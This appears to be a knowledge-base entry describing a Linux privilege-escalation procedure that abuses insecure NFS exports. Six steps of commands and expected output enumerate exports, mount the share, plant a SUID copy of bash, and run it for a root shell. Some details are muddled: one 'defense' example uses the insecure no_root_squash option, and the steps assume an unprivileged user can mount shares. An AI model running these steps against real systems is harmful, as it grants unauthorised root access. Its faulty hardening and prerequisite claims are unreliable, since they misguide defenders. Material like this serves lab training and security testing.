---
id: 56f24c13-a207-4b9a-8d96-ed89f6b37529
name: Linux-Privilege-Escalation-via-NFS-Root-Squashing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.334976+00:00'
updated_at: '2023-04-10T20:34:35.851143+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - '[[techniques/Setuid and Setgid|T1548.001 - Setuid and Setgid]]'
sub_techniques: []
tags:
  - '[[tags/Linux - Privilege Escalation]]'
  - '[[tags/NFS Root Squashing]]'
commands:
  - '[[commands/showmount-enumerate-exports]]'
  - '[[commands/mkdir-create-mount-point]]'
  - '[[commands/mount-nfs-share]]'
  - '[[commands/cp-copy-bash-to-mount-dir]]'
  - '[[commands/chmod-set-suid-bash]]'
  - '[[commands/execute-nfs-suid-bash]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-NFS-Root-Squashing

## Summary

This procedure exploits a misconfigured NFS share on a Linux system to achieve privilege escalation from a low-privileged user to root. By mounting a vulnerable NFS export that allows creation of root-owned files (typically due to options like all_squash with anonuid=0), an attacker can copy a shell binary to the mounted directory, set the SUID bit, and execute it to obtain a root shell.

## Description

NFS (Network File System) is commonly used to share directories between Linux systems. Root squashing is a default security feature that maps root UID (0) from clients to an unprivileged user (e.g., nfsnobody) on the server to prevent unauthorized root access. However, misconfigurations such as no_root_squash, all_squash with anonuid=0, or overly permissive exports (e.g., world-readable/writable shares owned by root) can allow a low-privileged user on the client to create files owned by root in the mounted share. Once mounted, the attacker copies /bin/bash to the share, sets the SUID bit (making it executable as root), and runs it to escalate privileges. This technique targets environments where NFS shares are exported insecurely, often in internal networks or lab setups. Success requires network access to the NFS server and the ability to mount shares on the client.

## Requirements

1. Low-privileged shell access on the target Linux client machine.
2. NFS client utilities installed (e.g., showmount, mount from nfs-common package).
3. Network connectivity to the NFS server (typically UDP/TCP port 2049 open).
4. The NFS share must be exported with vulnerable options allowing non-root users to create root-owned files (e.g., /etc/exports entry: /shared * (rw,sync,no_subtree_check,all_squash,anonuid=0)).
5. Write permissions on the mounted share from the client's perspective.

## Defense

- Configure NFS exports with root_squash and all_squash mapping to an unprivileged UID (e.g., anonuid=65534 for nobody) to prevent root-owned file creation.
- Restrict exports to specific IP addresses or hostnames using /etc/exports (e.g., /shared 192.168.1.0/24(rw,sync,no_root_squash,no_all_squash)).
- Use stronger NFS versions (v4) with Kerberos authentication (sec=krb5) instead of AUTH_SYS.
- Monitor NFS mount activity, file creations, and SUID binary changes using tools like auditd or inotify.
- Regularly audit /etc/exports and disable unnecessary NFS shares; prefer alternatives like SSHFS for secure sharing.

## Objectives

1. Identify and mount a vulnerable NFS share to gain write access to a root-owned directory.
2. Create an SUID root shell in the mounted share to bypass privilege restrictions.
3. Obtain a root shell on the client machine for further post-exploitation.

## Instructions

### Step 1: Enumerate NFS Exports

**Context**: Use showmount to query the NFS server for available exports and identify potentially vulnerable shares (e.g., those exported to * or the client's IP with rw permissions).

**Command** ([[commands/showmount-enumerate-exports]]):
```bash
showmount -e $_TARGET_IP
```

> This command lists the shares exported by the NFS server. Look for shares like /shared or /tmp that are world-exported (e.g., to *). If no shares are listed or access is denied, the server may not be vulnerable or firewall-protected.

**Expected Output**:
```
Export list for 10.10.10.10:
/shared *
/tmp 192.168.1.0/24
```

### Step 2: Create Local Mount Point

**Context**: Create a temporary directory on the client to serve as the mount point for the NFS share. This directory must be writable by the current user.

**Command** ([[commands/mkdir-create-mount-point]]):
```bash
mkdir $_MOUNT_POINT
```

> Replace $_MOUNT_POINT with a path like /tmp/nfsdir. This step prepares the local filesystem for mounting the remote share.

**Expected Output**:
```
(Directory created silently if successful; use ls /tmp to verify)
```

### Step 3: Mount the NFS Share

**Context**: Mount the identified vulnerable share to the local mount point. This allows access to the server's filesystem as if it were local, enabling file creation in the root-owned directory.

**Command** ([[commands/mount-nfs-share]]):
```bash
mount -t nfs $_SERVER_IP:$_SHARE_PATH $_MOUNT_POINT
```

> Use the IP and share path from Step 1 (e.g., 10.10.10.10:/shared /tmp/nfsdir). If the mount fails due to permissions, try with sudo if available, but this procedure assumes user-level mounting is possible. Verify with ls $_MOUNT_POINT to see share contents.

**Expected Output**:
```
(Mounts silently if successful; errors like "mount.nfs: access denied" indicate non-vulnerable config)
```

### Step 4: Copy Bash to the Mounted Share

**Context**: Copy the system bash binary to the mounted directory. Due to the vulnerable NFS config, the copied file will be owned by root on the server (and thus on the client mount).

**Command** ([[commands/cp-copy-bash-to-mount-dir]]):
```bash
cp /bin/bash $_MOUNT_POINT/bash
```

> This creates a root-owned copy of bash in the share. Verify ownership with ls -l $_MOUNT_POINT/bash; it should show root:root if the config is vulnerable.

**Expected Output**:
```
(Files copied silently; ls -l shows: -rwxr-xr-x 1 root root 1234567 date /tmp/nfsdir/bash)
```

### Step 5: Set SUID Bit on the Copied Bash

**Context**: Set the setuid bit on the copied bash binary so it executes with root privileges regardless of the calling user.

**Command** ([[commands/chmod-set-suid-bash]]):
```bash
chmod u+s $_MOUNT_POINT/bash
```

> This modifies the file permissions to include the setuid bit. Re-check with ls -l; the 's' in permissions indicates success (e.g., -rwsr-xr-x).

**Expected Output**:
```
(Permissions changed silently; ls -l shows: -rwsr-xr-x 1 root root 1234567 date /tmp/nfsdir/bash)
```

### Step 6: Execute the SUID Bash for Privilege Escalation

**Context**: Run the SUID-enabled bash to spawn a root shell. The -p flag preserves the environment to avoid restrictions.

**Command** ([[commands/execute-nfs-suid-bash]]):
```bash
$_MOUNT_POINT/bash -p
```

> If successful, this drops you into a root shell. Confirm with id or whoami. Exit the shell when done, and unmount with umount $_MOUNT_POINT to clean up.

**Expected Output**:
```
root@client:~# id
uid=0(root) gid=0(root) groups=0(root)
```
